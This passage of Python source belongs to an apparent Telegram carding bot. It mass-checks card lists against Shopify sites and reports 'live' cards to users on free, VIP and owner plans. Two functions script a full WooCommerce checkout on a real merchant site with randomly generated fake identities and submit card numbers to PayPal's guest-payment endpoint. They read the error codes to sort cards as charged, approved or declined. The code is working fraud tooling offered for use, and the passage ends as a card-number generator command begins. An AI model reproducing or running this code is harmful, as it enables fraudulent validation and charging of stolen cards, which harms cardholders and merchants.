                    if selected_site in user_sites:
                        user_sites.remove(selected_site)
                        sites_data[user_id] = user_sites
                        save_sites(sites_data)
                        
                        global _user_cycles
                        if user_id in _user_cycles:
                            del _user_cycles[user_id]
                    
                    result['response'] = f"Captcha detected - Site removed: {selected_site}"
                    error_count += 1
                    continue
                
                # Categorize response for text check
                is_live = False
                status_text = ""
                
                if '3d' in response_lower or 'authentication' in response_lower:
                    approved_count += 1
                    is_live = True
                    status_text = "Approved ❎"
                    # Add to approved cards list
                    approved_cards_list.append(f"∆ CARD ➜ {cc}\n∆ STATUS ➜ ✅ Approved: {result['response']}\nby E V I L ~\n")
                elif 'insufficient fund' in response_lower:
                    is_live = True
                    status_text = "Approved ❎"
                    # Don't count in approved_count
                    approved_cards_list.append(f"∆ CARD ➜ {cc}\n∆ STATUS ➜ ❎ Insufficient Fund: {result['response']}\nby E V I L ~\n")
                elif any(x in response_lower for x in ['thank you', 'order success', 'approve', 'charge', 'order_placed']):
                    charged_count += 1
                    is_live = True 
                    status_text = "Charged 💎"
                    # Add to charged cards list
                    charged_cards_list.append(f"∆ CARD ➜ {cc}\n∆ STATUS ➜ 💎 Charged: {result['response']}\nby E V I L ~\n")
                elif 'client token' in response_lower or result['gateway'] == 'NA' or 'token empty' in response_lower:
                    error_count += 1
                else:
                    declined_count += 1
                
                # Send live cards immediately with new format
                if is_live:
                    try:
                        # Get user status for plan display
                        user_status = get_user_status(message.from_user.id)
                        if user_status == 'owner':
                            plan_display = 'OWNER'
                        elif user_status == 'premium':
                            plan_display = 'VIP'
                        else:
                            plan_display = 'FREE'
                        
                        # Format price
                        if result['price'] != 'NA' and result['price']:
                            price_text = f"{result['price']}"
                        else:
                            price_text = "0.00$"
                        
                        live_msg = f"""<b>[#AutoShopify] | Legend ✦[SELF TEXT]</b>
━━━━━━━━━━━━━
<b>⌁ Card:</b> <code>{cc}</code>
<b>⌁ Status:</b> <code>{status_text}</code>
<b>⌁ Response:</b> <code>{html.escape(str(result['response']))}</code>
<b>⌁ Gateway:</b> <code>Normal {price_text}</code>
━━━━━━━━━━━━━
<b>[•] Checked By:</b> ⏤ <code>{user_name} [°{plan_display}°]</code>
<b>[•] T/t:</b> <code>{time_taken}</code> | <b>P/x:</b> <code>[Live⚡]</code>"""
                        
                        # Send only live message (no individual file)
                        bot.send_message(message.chat.id, live_msg, parse_mode="HTML")
                    except Exception as e:
                        print(f"Error sending live card: {e}")
                
                results.append({
                    'cc': cc,
                    'status': status_text if is_live else 'Declined',
                    'response': result['response'],
                    'gateway': result['gateway'],
                    'price': result['price'],
                    'site': selected_site,
                    'time': f"{end_time - check_start_time:.1f}s"
                })
            
            # Update progress message after every card check
            try:
                progress_msg = f"""⚡ TEXT SHOPIFY CHECKING...

----------------------------------------------
∆ Progress: {i + 1}/{total_cards} cards
----------------------------------------------
∆ ᴄʜᴀʀɢᴇ 💎: {charged_count}
∆ ᴀᴘᴘʀᴏᴠᴇ ❎: {approved_count} 
∆ ᴅᴇᴄʟɪɴᴇᴅ ❌: {declined_count} 
∆ ᴇʀʀᴏʀ ⚠️: {error_count}
----------------------------------------------
"""
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=progress_msg, parse_mode="HTML")
            except:
                pass  # In case message can't be edited
            
            # Small delay between checks
            time.sleep(1)
        
        # Final summary with new format
        end_time = time.time()
        total_time = end_time - start_time
        total_checked = approved_count + charged_count + declined_count + error_count
        
        summary_msg = f"""✅ Summary of Check
━━━━━━━━━━━━━
⊙ Total: {total_checked}
⊙ Charged 💎: {charged_count}
⊙ Approved ❎: {approved_count}
⊙ Declined ❌: {declined_count}
━━━━━━━━━━━━━
⌛ Time Taken: {'{:.2f}'.format(total_time)}s
 [•] Dev >> <a href="tg://user?id={OWNER_ID}">E V I L ~</a>"""
        
        bot.send_message(message.chat.id, summary_msg, parse_mode="HTML")
        
        # Save approved and charged cards to file if any exist
        if approved_cards_list or charged_cards_list:
            try:
                current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"approved_charged_cards_{current_time}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"=== TSH RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
                    f.write(f"Total Checked: {total_checked}\n")
                    f.write(f"Charged: {charged_count}\n")
                    f.write(f"Approved: {approved_count}\n")
                    f.write(f"Time Taken: {'{:.2f}'.format(total_time)}s\n\n")
                    
                    if charged_cards_list:
                        f.write("=== CHARGED CARDS ===\n")
                        for card in charged_cards_list:
                            f.write(card + "\n")
                        f.write("\n")
                    
                    if approved_cards_list:
                        f.write("=== APPROVED CARDS ===\n")
                        for card in approved_cards_list:
                            f.write(card + "\n")
                
                # Send the file
                with open(filename, 'rb') as f:
                    bot.send_document(
                        message.chat.id, 
                        f, 
                        caption=f"❤️‍🩹 Approved & Charged Cards File\n💎 Charged: {charged_count} | ❎ Approved: {approved_count}",
                        parse_mode="HTML"
                    )
                
                # Clean up the file
                os.remove(filename)
                
            except Exception as e:
                print(f"Error creating/sending file: {e}")
                bot.send_message(message.chat.id, f"⚠️ Could not create results file: {str(e)}")
        
        # Clean up active mass check tracking
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
    
    except Exception as e:
        # Clean up even on error
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
        
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error in text check: {safe_error}")

def paypal_1dollar_check(n, mm, yy, cvc, proxy=None):
    try:
        user = user_agent.generate_user_agent()
        r = requests.session()
        
        # Set proxy if provided
        if proxy:
            r.proxies = {'http': proxy, 'https': proxy}
        
        def generate_full_name():
            first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                           "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                           "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                           "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                           "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                           "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                           "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                           "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                           "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                           "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
            
            last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                           "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                           "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                           "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                           "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                           "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                           "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                           "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
            
            full_name = random.choice(first_names) + " " + random.choice(last_names)
            first_name, last_name = full_name.split()
            return first_name, last_name
        
        def generate_address():
            cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
            states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
            streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
            zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
        
            city = random.choice(cities)
            state = states[cities.index(city)]
            street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
            zip_code = zip_codes[states.index(state)]
        
            return city, state, street_address, zip_code
        
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        
        def generate_random_account():
            name = ''.join(random.choices(string.ascii_lowercase, k=20))
            number = ''.join(random.choices(string.digits, k=4))
            return f"{name}{number}@gmail.com"
        
        acc = generate_random_account()
        num = f"303{''.join(random.choices(string.digits, k=7))}"
        
        files = {'quantity': (None, '1'), 'add-to-cart': (None, '4451')}
        multipart_data = MultipartEncoder(fields=files)
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'content-type': multipart_data.content_type,
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/shop/i-buy/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, timeout=120)
        
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'referer': 'https://switchupcb.com/cart/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        
        response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, timeout=120)
        
        sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
        nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
        check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
        create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
        
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
        }
        
        params = {'wc-ajax': 'update_order_review'}
        data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3DHouda%26billing_last_name%3DAlaa%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DNew%2520York%26billing_address_2%3D%26billing_city%3DNew%2520York%26billing_state%3DNY%26billing_postcode%3D10080%26billing_phone%3D3008796324%26billing_email%3Dtapt1744%2540gmail.com%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
        
        response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, timeout=120)
        
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'pragma': 'no-cache',
            'referer': 'https://switchupcb.com/checkout/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
        }
        
        params = {'wc-ajax': 'ppc-create-order'}
        
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
            'createaccount': False,
            'save_payment_method': False,
        }
        
        response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data, timeout=120)
        
        paypal_id = response.json()['data']['id']
        
        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
        session_id = f'uid_{lol1}_{lol3}'
        button_session_id = f'uid_{lol2}_{lol3}'
        
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6', 
            'referer': 'https://www.paypal.com/smart/buttons',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        
        params = {
            'sessionID': session_id,
            'buttonSessionID': button_session_id,
            'locale.x': 'ar_EG',
            'commit': 'true',
            'hasShippingCallback': 'false',
            'env': 'production',
            'country.x': 'EG',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmaW50ZWdyYXRpb24tZGF0ZT0yMDI0LTEyLTMxJmNvbXBvbmVudHM9YnV0dG9ucyxmdW5kaW5nLWVsaWdpYmlsaXR5JnZhdWx0PWZhbHNlJmNvbW1pdD10cnVlJmludGVudD1jYXB0dXJlJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiV29vX1BQQ1AiLCJkYXRhLXVpZCI6InVpZF9wd2FlZWlzY3V0dnFrYXVvY293a2dmdm52a294bm0ifX0=',
            'disable-card': '',
            'token': paypal_id,
        }
        
        response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, timeout=120)
        
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
        }
        
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': paypal_id,
                'card': {
                    'cardNumber': n,
                    'type': 'VISA',
                    'expirationDate': mm+'/20'+yy,
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': 'New York',
                    'line2': None,
                    'city': 'New York',
                    'state': 'NY',
                    'postalCode': '10080',
                    'country': 'US',
                },
                'email': acc,
                'currencyConversionType': 'VENDOR',
            },
            'operationName': None,
        }
        
        response = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
        
        last = response.text
        
        if ('ADD_SHIPPING_ERROR' in last or '"status": "succeeded"' in last or 
            'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
            return 'CHARGE 1$ ✅', last
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return 'Approve ❎', 'is3DSecureRequired'
        elif 'INVALID_SECURITY_CODE' in last:
            return 'APPROVED CCN ✅', 'INVALID_SECURITY_CODE'
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return 'APPROVED ✅', 'EXISTING_ACCOUNT_RESTRICTED'
        elif 'INVALID_BILLING_ADDRESS' in last:
            return 'APPROVED - AVS ✅', 'INVALID_BILLING_ADDRESS'
        else:
            try:
                response_json = response.json()
                if 'errors' in response_json and len(response_json['errors']) > 0:
                    message = response_json['errors'][0].get('message', 'Unknown error')
                    if 'data' in response_json['errors'][0] and len(response_json['errors'][0]['data']) > 0:
                        code = response_json['errors'][0]['data'][0].get('code', 'NO_CODE')
                        return f'DECLINED ❌', f'{code} - {message}'
                    return f'DECLINED ❌', message
                return 'DECLINED ❌', response.text[:100] if hasattr(response, 'text') else 'Unknown error'
            except (json.JSONDecodeError, ValueError, KeyError, IndexError, TypeError) as e:
                return 'DECLINED ❌', response.text[:100] if hasattr(response, 'text') else 'Unknown error'
                
    except Exception as e:
        return 'ERROR ❌', str(e)

def paypal_check(n, mm, yy, cvc, proxy=None):
    try:
        user = user_agent.generate_user_agent()
        r = requests.session()
        
        # Set proxy if provided
        if proxy:
            r.proxies = {'http': proxy, 'https': proxy}
        
        def generate_full_name():
            first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                           "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                           "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa"]
            last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                           "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
            full_name = random.choice(first_names) + " " + random.choice(last_names)
            first_name, last_name = full_name.split()
            return first_name, last_name
        
        def generate_address():
            cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
            states = ["NY", "CA", "IL", "TX", "AZ"]
            streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
            zip_codes = ["10001", "90001", "60601", "77001", "85001"]
            city = random.choice(cities)
            state = states[cities.index(city)]
            street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
            zip_code = zip_codes[states.index(state)]
            return city, state, street_address, zip_code
        
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        
        def generate_random_account():
            name = ''.join(random.choices(string.ascii_lowercase, k=20))
            number = ''.join(random.choices(string.digits, k=4))
            return f"{name}{number}@gmail.com"
        
        acc = generate_random_account()
        num = f"303{''.join(random.choices(string.digits, k=7))}"
        
        files = {'quantity': (None, '1'), 'add-to-cart': (None, '4451')}
        multipart_data = MultipartEncoder(fields=files)
        headers = {
            'authority': 'switchupcb.com',
            'content-type': multipart_data.content_type,
            'user-agent': user,
        }
        response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, timeout=120)
        
        headers = {'authority': 'switchupcb.com', 'user-agent': user}
        response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, timeout=120)
        
        sec_match = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
        if not sec_match:
            return 'ERROR ❌', 'Failed to extract nonce'
        sec = sec_match.group(1)
        
        nonce_match = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
        if not nonce_match:
            return 'ERROR ❌', 'Failed to extract nonce'
        nonce = nonce_match.group(1)
        
        check_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
        if not check_match:
            return 'ERROR ❌', 'Failed to extract checkout nonce'
        check = check_match.group(1)
        
        create_match = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
        if not create_match:
            return 'ERROR ❌', 'Failed to extract create nonce'
        create = create_match.group(1)
        
        headers = {
            'authority': 'switchupcb.com',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': user,
        }
        params = {'wc-ajax': 'update_order_review'}
        data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true'
        response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, timeout=120)
        
        headers = {
            'authority': 'switchupcb.com',
            'content-type': 'application/json',
            'user-agent': user,
        }
        params = {'wc-ajax': 'ppc-create-order'}
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}',
            'createaccount': False,
            'save_payment_method': False,
        }
        response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data, timeout=120)
        
        paypal_id = response.json()['data']['id']
        
        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
        session_id = f'uid_{lol1}_{lol3}'
        button_session_id = f'uid_{lol2}_{lol3}'
        
        headers = {
            'authority': 'www.paypal.com',
            'user-agent': user,
        }
        params = {
            'sessionID': session_id,
            'buttonSessionID': button_session_id,
            'token': paypal_id,
        }
        response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, timeout=120)
        
        headers = {
            'authority': 'www.paypal.com',
            'content-type': 'application/json',
            'user-agent': user,
        }
        json_data = {
            'query': '''
        mutation payWithCard(
            $token: String!
            $card: CardInput!
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        ''',
            'variables': {
                'token': paypal_id,
                'card': {
                    'cardNumber': n,
                    'expirationDate': f'{mm}/20{yy}',
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': 'New York',
                    'city': 'New York',
                    'state': 'NY',
                    'postalCode': '10080',
                    'country': 'US',
                },
                'email': acc,
                'currencyConversionType': 'VENDOR',
            },
            'operationName': None,
        }
        
        response = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
        last = response.text
        
        if ('ADD_SHIPPING_ERROR' in last or 'NEED_CREDIT_CARD' in last or '"status": "succeeded"' in last or 
            'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
            return 'CHARGE 2$ ✅', last
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return 'Approve ❎', 'is3DSecureRequired'
        elif 'INVALID_SECURITY_CODE' in last:
            return 'APPROVED CCN ✅', 'INVALID_SECURITY_CODE'
        elif 'INVALID_BILLING_ADDRESS' in last:
            return 'APPROVED - AVS ✅', 'INVALID_BILLING_ADDRESS'
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return 'APPROVED ✅', 'EXISTING_ACCOUNT_RESTRICTED'
        else:
            try:
                response_json = response.json()
                if 'errors' in response_json and len(response_json['errors']) > 0:
                    message = response_json['errors'][0].get('message', 'Unknown error')
                    if 'data' in response_json['errors'][0] and len(response_json['errors'][0]['data']) > 0:
                        code = response_json['errors'][0]['data'][0].get('code', 'NO_CODE')
                        return f'DECLINED ❌', f'{code} - {message}'
                    return f'DECLINED ❌', message
                return 'DECLINED ❌', response.text[:100] if hasattr(response, 'text') else 'Unknown error'
            except (json.JSONDecodeError, ValueError, KeyError, IndexError, TypeError) as e:
                return 'DECLINED ❌', response.text[:100] if hasattr(response, 'text') else 'Unknown error'
                
    except Exception as e:
        return 'ERROR ❌', str(e)

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('/gen') or message.text.lower().startswith('.gen')))
def gen_command(message):
    try:
        command_text = message.text.strip()
        parts = command_text.split()
        
